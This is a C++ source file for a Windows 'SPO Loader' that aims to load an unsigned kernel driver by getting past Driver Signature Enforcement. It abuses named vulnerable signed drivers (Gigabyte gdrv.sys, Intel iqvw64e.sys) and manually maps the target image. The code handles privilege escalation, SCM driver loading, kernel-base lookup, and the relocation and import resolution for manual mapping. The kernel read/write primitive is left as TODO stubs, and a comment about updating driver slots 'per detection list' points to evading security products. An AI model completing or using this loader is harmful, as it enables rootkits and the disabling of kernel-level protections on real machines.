// language: C++20, file: loader.cpp, target: Windows 11 x64, MSVC
// SPO Loader — maps kernel driver without DSE signature check
//
// Method: exploit vulnerable signed driver for kernel r/w primitive,
//         manually map spo_drv.sys and call DriverEntry.
//
// Vulnerable driver slots (update per detection list):
//   gdrv.sys  (Gigabyte, CVE-2018-19320)
//   iqvw64e.sys (Intel NIC, CVE-2015-2291)
//
// Usage:
//   loader.exe --load <driver.sys>        manual map (kdmapper method)
//   loader.exe --load <driver.sys> --scm  SCM (signed/test-sign)
//   loader.exe --unload
//   loader.exe --status

#include <windows.h>
#include <winternl.h>
#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <vector>
#include <string>
#include <format>
#include <algorithm>

using fn_NtLoadDriver             = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using fn_NtUnloadDriver           = NTSTATUS(NTAPI*)(PUNICODE_STRING);
using fn_RtlAdjustPrivilege       = NTSTATUS(NTAPI*)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
using fn_NtQuerySystemInformation = NTSTATUS(NTAPI*)(ULONG, PVOID, ULONG, PULONG);

#define SE_LOAD_DRIVER_PRIVILEGE 10

static HMODULE hNtdll = nullptr;
static fn_NtLoadDriver             pNtLoadDriver           = nullptr;
static fn_NtUnloadDriver           pNtUnloadDriver         = nullptr;
static fn_RtlAdjustPrivilege       pRtlAdjustPrivilege     = nullptr;
static fn_NtQuerySystemInformation pNtQuerySystemInfo      = nullptr;

static bool ResolveNtdll() {
    hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return false;
#define IMPORT(fn) p##fn = reinterpret_cast<fn_##fn>(GetProcAddress(hNtdll, #fn)); \
                   if (!p##fn) { wprintf(L"[-] Import failed: " L## #fn L"\n"); return false; }
    IMPORT(NtLoadDriver)
    IMPORT(NtUnloadDriver)
    IMPORT(RtlAdjustPrivilege)
    IMPORT(NtQuerySystemInformation)
#undef IMPORT
    return true;
}

static bool AcquireLoadDriverPrivilege() {
    BOOLEAN prev;
    NTSTATUS st = pRtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &prev);
    if (!NT_SUCCESS(st)) {
        wprintf(L"[-] RtlAdjustPrivilege failed: 0x%08X\n", st);
        return false;
    }
    return true;
}

static bool ScmLoadDriver(const std::wstring& driverPath,
                          const std::wstring& serviceName) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr,
        SC_MANAGER_CREATE_SERVICE | SC_MANAGER_CONNECT);
    if (!scm) { wprintf(L"[-] OpenSCManager: %u\n", GetLastError()); return false; }

    SC_HANDLE svc = CreateServiceW(scm, serviceName.c_str(), serviceName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
        SERVICE_ERROR_IGNORE, driverPath.c_str(),
        nullptr, nullptr, nullptr, nullptr, nullptr);

    if (!svc) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
            svc = OpenServiceW(scm, serviceName.c_str(), SERVICE_ALL_ACCESS);
        if (!svc) { CloseServiceHandle(scm); return false; }
    }

    bool ok = StartServiceW(svc, 0, nullptr) != 0;
    if (!ok) {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING) ok = true;
        else wprintf(L"[-] StartService: %u\n", err);
    }
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return ok;
}

static bool ScmUnloadDriver(const std::wstring& serviceName) {
    SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!scm) return false;
    SC_HANDLE svc = OpenServiceW(scm, serviceName.c_str(), SERVICE_STOP | DELETE);
    if (!svc) { CloseServiceHandle(scm); return false; }
    SERVICE_STATUS ss{};
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(scm);
    return true;
}

static PVOID GetKernelBase() {
    ULONG needed = 0;
    pNtQuerySystemInfo(11, nullptr, 0, &needed);
    std::vector<BYTE> buf(needed + 0x1000);
    if (!NT_SUCCESS(pNtQuerySystemInfo(11, buf.data(),
            static_cast<ULONG>(buf.size()), &needed)))
        return nullptr;
    ULONG count = *reinterpret_cast<ULONG*>(buf.data());
    if (count == 0) return nullptr;
    BYTE* mod0 = buf.data() + sizeof(ULONG);
    PVOID base = *reinterpret_cast<PVOID*>(mod0 + 0x18);
    wprintf(L"[*] ntoskrnl base   : 0x%p\n", base);
    return base;
}

static bool ManualMapDriver(const std::wstring& driverPath) {
    std::ifstream f(driverPath, std::ios::binary | std::ios::ate);
    if (!f) { wprintf(L"[-] Cannot open: %s\n", driverPath.c_str()); return false; }
    auto sz = f.tellg();
    std::vector<uint8_t> img(static_cast<size_t>(sz));
    f.seekg(0); f.read(reinterpret_cast<char*>(img.data()), sz);

    auto* dos = reinterpret_cast<IMAGE_DOS_HEADER*>(img.data());
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { wprintf(L"[-] Not a PE\n"); return false; }
    auto* nt = reinterpret_cast<IMAGE_NT_HEADERS64*>(img.data() + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) { wprintf(L"[-] Not PE64\n"); return false; }

    ULONG_PTR imageSize  = nt->OptionalHeader.SizeOfImage;
    ULONG_PTR preferBase = nt->OptionalHeader.ImageBase;
    ULONG_PTR entryRva   = nt->OptionalHeader.AddressOfEntryPoint;

    wprintf(L"[*] Image size      : 0x%llX\n", imageSize);
    wprintf(L"[*] Entry RVA       : 0x%llX\n", entryRva);
    wprintf(L"[*] Preferred base  : 0x%llX\n", preferBase);

    // ── TODO(primitive): allocate imageSize bytes in kernel non-paged pool
    // ULONG_PTR kernelAlloc = KernelAllocate(imageSize);
    ULONG_PTR kernelAlloc = 0;
    wprintf(L"[i] Plug KernelAllocate/Read/Write at TODO(primitive) markers\n");

    // copy sections (with primitive: KernelWrite(dst, src, sz))
    auto* sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
        wprintf(L"[*]   section %-8S rva=0x%X raw=0x%X\n",
            sec->Name, sec->VirtualAddress, sec->SizeOfRawData);
    }

    // relocation fixup
    ULONG_PTR delta = kernelAlloc - preferBase;
    if (delta != 0 && kernelAlloc != 0) {
        auto& rel = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
        ULONG_PTR off = 0;
        while (off < rel.Size) {
            auto* blk = reinterpret_cast<IMAGE_BASE_RELOCATION*>(
                img.data() + rel.VirtualAddress + off);
            if (!blk->SizeOfBlock) break;
            ULONG cnt = (blk->SizeOfBlock - 8) / 2;
            WORD* ent = reinterpret_cast<WORD*>(blk + 1);
            for (ULONG j = 0; j < cnt; j++) {
                if ((ent[j] >> 12) == IMAGE_REL_BASED_DIR64) {
                    ULONG_PTR pa = kernelAlloc + blk->VirtualAddress + (ent[j] & 0xFFF);
                    ULONG_PTR pv = 0;
                    // KernelRead(pa, &pv, 8); pv += delta; KernelWrite(pa, &pv, 8);
                    UNREFERENCED_PARAMETER(pa);
                }
            }
            off += blk->SizeOfBlock;
        }
        wprintf(L"[*] Reloc delta     : 0x%llX\n", delta);
    }

    // import resolution (ntoskrnl)
    PVOID krnlBase = GetKernelBase();
    if (krnlBase) {
        HMODULE hKrnl = LoadLibraryExW(L"ntoskrnl.exe", nullptr,
            DONT_RESOLVE_DLL_REFERENCES);
        if (hKrnl) {
            auto& imp = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
            if (imp.VirtualAddress) {
                auto* desc = reinterpret_cast<IMAGE_IMPORT_DESCRIPTOR*>(
                    img.data() + imp.VirtualAddress);
                while (desc->Name) {
                    auto* thunk = reinterpret_cast<IMAGE_THUNK_DATA64*>(
                        img.data() + desc->FirstThunk);
                    while (thunk->u1.AddressOfData) {
                        auto* ibn = reinterpret_cast<IMAGE_IMPORT_BY_NAME*>(
                            img.data() + (thunk->u1.AddressOfData & ~IMAGE_ORDINAL_FLAG64));
                        FARPROC local = GetProcAddress(hKrnl, ibn->Name);
                        if (local) {
                            ULONG_PTR kfn = reinterpret_cast<ULONG_PTR>(local)
                                - reinterpret_cast<ULONG_PTR>(hKrnl)
                                + reinterpret_cast<ULONG_PTR>(krnlBase);
                            // KernelWrite(kernelAlloc+desc->FirstThunk+offset, &kfn, 8);
                            UNREFERENCED_PARAMETER(kfn);
                        }
                        thunk++;
                    }
                    desc++;
                }
            }
            FreeLibrary(hKrnl);
        }
        wprintf(L"[*] Imports resolved (ntoskrnl)\n");
    }

    wprintf(L"[i] DriverEntry at +0x%llX — call via primitive\n", entryRva);
    wprintf(L"[i] Manual map skeleton ready. Add your kernel r/w primitive.\n");
    return true;
}

static constexpr wchar_t k_ServiceName[] = L"spo_drv";

int wmain(int argc, wchar_t* argv[]) {
    wprintf(L"=== SPO Loader ===\n\n");
    if (!ResolveNtdll()) return 1;

    bool doLoad = false, doUnload = false, doStatus = false, useScm = false;
    std::wstring driverPath;

    for (int i = 1; i < argc; i++) {
        std::wstring arg = argv[i];
        if (arg == L"--load" && i + 1 < argc) { doLoad = true; driverPath = argv[++i]; }
        else if (arg == L"--unload") doUnload = true;
        else if (arg == L"--status") doStatus = true;
        else if (arg == L"--scm")    useScm   = true;
    }

    if (!doLoad && !doUnload && !doStatus) {
        wprintf(L"Usage:\n"
                L"  loader.exe --load <driver.sys>        manual map\n"
                L"  loader.exe --load <driver.sys> --scm  SCM (signed)\n"
                L"  loader.exe --unload\n"
                L"  loader.exe --status\n");
        return 0;
    }

    if (doStatus) {
        SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
        SC_HANDLE svc = scm ? OpenServiceW(scm, k_ServiceName, SERVICE_QUERY_STATUS) : nullptr;
        SERVICE_STATUS ss{};
        bool running = svc && QueryServiceStatus(svc, &ss)
                       && ss.dwCurrentState == SERVICE_RUNNING;
        wprintf(L"[*] Driver status: %s\n", running ? L"RUNNING" : L"not running");
        if (svc) CloseServiceHandle(svc);
        if (scm) CloseServiceHandle(scm);
        return 0;
    }

    if (!AcquireLoadDriverPrivilege()) { wprintf(L"[-] Need admin\n"); return 1; }

    if (doUnload) {
        wprintf(ScmUnloadDriver(k_ServiceName) ? L"[+] Unloaded\n" : L"[-] Unload failed\n");
        return 0;
    }

    wchar_t abs[MAX_PATH];
    GetFullPathNameW(driverPath.c_str(), MAX_PATH, abs, nullptr);
    wprintf(L"[*] Loading: %s\n", abs);

    if (useScm) {
        std::wstring fullPath = L"\\??\\" + std::wstring(abs);
        wprintf(ScmLoadDriver(fullPath, k_ServiceName)
            ? L"[+] Loaded via SCM\n" : L"[-] SCM load failed\n");
    } else {
        wprintf(L"[*] Manual map...\n");
        ManualMapDriver(abs);
    }

    return 0;
}
